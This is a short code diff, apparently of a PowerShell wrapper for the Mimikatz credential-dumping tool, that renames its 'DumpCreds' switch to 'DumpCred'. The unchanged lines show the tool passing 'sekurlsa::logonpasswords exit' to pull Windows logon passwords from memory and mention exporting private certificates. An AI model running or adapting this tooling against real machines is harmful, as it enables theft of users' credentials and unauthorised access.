@@ -44,15 +44,15 @@ Switch: Use mumukatz to export all private certificates (even if they are marked
 
 #>
 
-[CmdletBinding(DefaultParameterSetName="DumpCreds")]
+[CmdletBinding(DefaultParameterSetName="DumpCred")]
 Param(
 	[Parameter(Position = 0)]
 	[String[]]
 	$ComputerName,
 
-    [Parameter(ParameterSetName = "DumpCreds", Position = 1)]
+    [Parameter(ParameterSetName = "DumpCred", Position = 1)]
     [Switch]
-    $DumpCreds,
+    $DumpCred,
 
     [Parameter(ParameterSetName = "DumpCertis", Position = 1)]
     [Switch]
@@ -2686,7 +2686,7 @@ Function Main
 	Write-Verbose "PowerShell ProcessID: $PID"
 	
 
-	if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
+	if ($PsCmdlet.ParameterSetName -ieq "DumpCred")
 	{
 		$ExeArgs = "sekurlsa::logonpasswords exit"
 	}
